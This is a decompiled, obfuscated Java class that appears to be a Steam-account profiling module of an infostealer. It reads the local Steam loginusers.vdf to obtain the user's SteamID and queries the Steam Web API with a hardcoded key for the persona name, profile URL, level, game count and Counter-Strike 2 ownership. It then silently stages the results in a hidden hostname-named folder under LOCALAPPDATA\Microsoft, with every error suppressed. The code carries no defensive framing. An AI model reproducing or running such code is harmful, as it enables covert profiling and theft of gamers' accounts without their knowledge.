package 0.0.0.0;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Paths;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Iterator;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class 0g {
   private static final String 0 = "440D7F4D810EF9298D25EDDF37C1F902";
   private static final String 1 = "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf";
   private static final String 2 = System.getenv("LOCALAPPDATA") + "\\Microsoft\\steam.txt";

   public static void _/* $FF was: 0*/() {
      String steamId = null;
      JsonObject userInfo = null;
      int steamLevel = -1;
      boolean hasCS2 = false;
      int gameCount = -1;

      try {
         steamId = 0();
         if (steamId != null) {
            try {
               userInfo = 0(steamId);
            } catch (Exception var10) {
            }

            try {
               steamLevel = 0(steamId);
            } catch (Exception var9) {
            }

            try {
               hasCS2 = 0(steamId);
            } catch (Exception var8) {
            }

            try {
               gameCount = 1(steamId);
            } catch (Exception var7) {
            }

            try {
               0(userInfo, steamLevel, hasCS2, gameCount);
            } catch (Exception var6) {
            }
         }
      } catch (Exception var11) {
      }

   }

   private static String _/* $FF was: 0*/() throws IOException {
      String content = new String(Files.readAllBytes(Paths.get("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")));
      Pattern pattern = Pattern.compile("\"(\\d{17})\"");
      Matcher matcher = pattern.matcher(content);

      try {
         return matcher.find() ? matcher.group(1) : null;
      } catch (IOException var3) {
         throw var3;
      }
   }

   private static JsonObject _/* $FF was: 0*/(String steamId) throws IOException {
      String urlString = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + steamId;
      URL url = new URL(urlString);
      HttpURLConnection connection = (HttpURLConnection)url.openConnection();
      connection.setRequestMethod("GET");
      BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
      StringBuilder content = new StringBuilder();

      while(true) {
         String inputLine;
         String var10000 = inputLine = in.readLine();

         try {
            if (var10000 == null) {
               break;
            }

            content.append(inputLine);
         } catch (IOException var8) {
            throw var8;
         }
      }

      in.close();
      JsonObject jsonResponse = JsonParser.parseString(content.toString()).getAsJsonObject();
      return jsonResponse.getAsJsonObject("response").getAsJsonArray("players").get(0).getAsJsonObject();
   }

   private static int _/* $FF was: 0*/(String steamId) throws IOException {
      String urlString = "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + steamId;
      URL url = new URL(urlString);
      HttpURLConnection connection = (HttpURLConnection)url.openConnection();
      connection.setRequestMethod("GET");
      BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
      StringBuilder content = new StringBuilder();

      while(true) {
         String inputLine;
         String var10000 = inputLine = in.readLine();

         try {
            if (var10000 == null) {
               break;
            }

            content.append(inputLine);
         } catch (IOException var8) {
            throw var8;
         }
      }

      in.close();
      JsonObject jsonResponse = JsonParser.parseString(content.toString()).getAsJsonObject();
      return jsonResponse.getAsJsonObject("response").get("player_level").getAsInt();
   }

   private static boolean _/* $FF was: 0*/(String steamId) throws IOException {
      String urlString = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + steamId;
      URL url = new URL(urlString);
      HttpURLConnection connection = (HttpURLConnection)url.openConnection();
      connection.setRequestMethod("GET");
      BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
      StringBuilder content = new StringBuilder();

      while(true) {
         String inputLine;
         String var10000 = inputLine = in.readLine();

         try {
            if (var10000 == null) {
               break;
            }

            content.append(inputLine);
         } catch (IOException var12) {
            throw var12;
         }
      }

      in.close();
      JsonObject jsonResponse = JsonParser.parseString(content.toString()).getAsJsonObject();
      JsonArray games = jsonResponse.getAsJsonObject("response").getAsJsonArray("games");
      Iterator var9 = games.iterator();

      while(var9.hasNext()) {
         JsonElement game = (JsonElement)var9.next();

         try {
            if (game.getAsJsonObject().get("appid").getAsInt() == 730) {
               return true;
            }
         } catch (IOException var11) {
            throw var11;
         }
      }

      return false;
   }

   private static int _/* $FF was: 1*/(String steamId) throws IOException {
      String urlString = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + steamId;
      URL url = new URL(urlString);
      HttpURLConnection connection = (HttpURLConnection)url.openConnection();
      connection.setRequestMethod("GET");
      BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
      StringBuilder content = new StringBuilder();

      while(true) {
         String inputLine;
         String var10000 = inputLine = in.readLine();

         try {
            if (var10000 == null) {
               break;
            }

            content.append(inputLine);
         } catch (IOException var8) {
            throw var8;
         }
      }

      in.close();
      JsonObject jsonResponse = JsonParser.parseString(content.toString()).getAsJsonObject();
      return jsonResponse.getAsJsonObject("response").get("game_count").getAsInt();
   }

   private static void _/* $FF was: 0*/(JsonObject userInfo, int steamLevel, boolean hasCS2, int gameCount) throws IOException {
      String var10000;
      label74: {
         try {
            if (userInfo != null) {
               var10000 = userInfo.get("steamid").getAsString();
               break label74;
            }
         } catch (IOException var18) {
            throw var18;
         }

         var10000 = "N/A";
      }

      String steamId = var10000;

      label66: {
         try {
            if (userInfo != null) {
               var10000 = userInfo.get("personaname").getAsString();
               break label66;
            }
         } catch (IOException var17) {
            throw var17;
         }

         var10000 = "N/A";
      }

      String personaName = var10000;

      label58: {
         try {
            if (userInfo != null) {
               var10000 = userInfo.get("profileurl").getAsString();
               break label58;
            }
         } catch (IOException var16) {
            throw var16;
         }

         var10000 = "N/A";
      }

      String profileUrl = var10000;

      long var19;
      label50: {
         try {
            if (userInfo != null) {
               var19 = userInfo.get("timecreated").getAsLong();
               break label50;
            }
         } catch (IOException var15) {
            throw var15;
         }

         var19 = -1L;
      }

      long timeCreated = var19;
      String formattedTimeCreated = 0(timeCreated);
      String saveFolderPath = System.getenv("LOCALAPPDATA") + "\\Microsoft\\" + 1() + "\\Steam";
      String filePath = saveFolderPath + "\\steam.txt";
      File folder = new File(saveFolderPath);

      try {
         if (!folder.exists()) {
            folder.mkdirs();
         }
      } catch (IOException var14) {
         throw var14;
      }

      String fileContent = String.format("Steam Id: %s\nSteam Adı: %s\nProfile URL: %s\nSteam Level: %d\nHesap Tarihi: %s\nOyun Sayısı: %d", steamId, personaName, profileUrl, steamLevel, formattedTimeCreated, gameCount);
      if (hasCS2) {
         fileContent = fileContent + "\nCounter Strike 2: Var";
      }

      Files.write(Paths.get(filePath), fileContent.getBytes(), new OpenOption[0]);
   }

   private static String _/* $FF was: 0*/(long unixTimestamp) {
      try {
         if (unixTimestamp == -1L) {
            return "N/A";
         }
      } catch (RuntimeException var5) {
         throw var5;
      }

      Instant instant = Instant.ofEpochSecond(unixTimestamp);
      LocalDateTime dateTime = LocalDateTime.ofInstant(instant, ZoneId.systemDefault());
      DateTimeFormatter formatter = DateTimeFormatter.ofPattern("dd MMMM yyyy", new Locale("tr"));
      return formatter.format(dateTime);
   }

   private static String _/* $FF was: 1*/() {
      try {
         Process process = Runtime.getRuntime().exec("hostname");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
         String computerName = reader.readLine();

         String var10000;
         try {
            process.destroy();
            if (computerName != null) {
               var10000 = computerName.trim();
               return var10000;
            }
         } catch (Exception var3) {
            throw var3;
         }

         var10000 = "Unknown";
         return var10000;
      } catch (Exception var4) {
         return "Unknown";
      }
   }
}
